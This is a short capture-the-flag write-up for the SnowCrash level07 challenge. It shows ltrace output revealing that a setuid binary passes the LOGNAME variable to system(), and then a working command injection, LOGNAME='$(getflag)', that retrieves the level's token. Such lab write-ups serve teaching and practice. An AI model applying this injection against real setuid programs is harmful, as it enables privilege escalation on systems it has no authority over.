## level07

run `ltrace` on the setuid binary:
```
level07@SnowCrash:~$ ltrace ./level07 alsdfjk
__libc_start_main(0x8048514, 2, 0xbffff864, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                                                        = 2007
geteuid()                                                                                                                        = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                              = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                              = 0
getenv("LOGNAME")                                                                                                                = "level07"
asprintf(0xbffff7b4, 0x8048688, 0xbfffff7c, 0xb7e5ee55, 0xb7fed280)                                                              = 18
system("/bin/echo level07 "
```

```
level07@SnowCrash:~$ LOGNAME='$(getflag)' ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```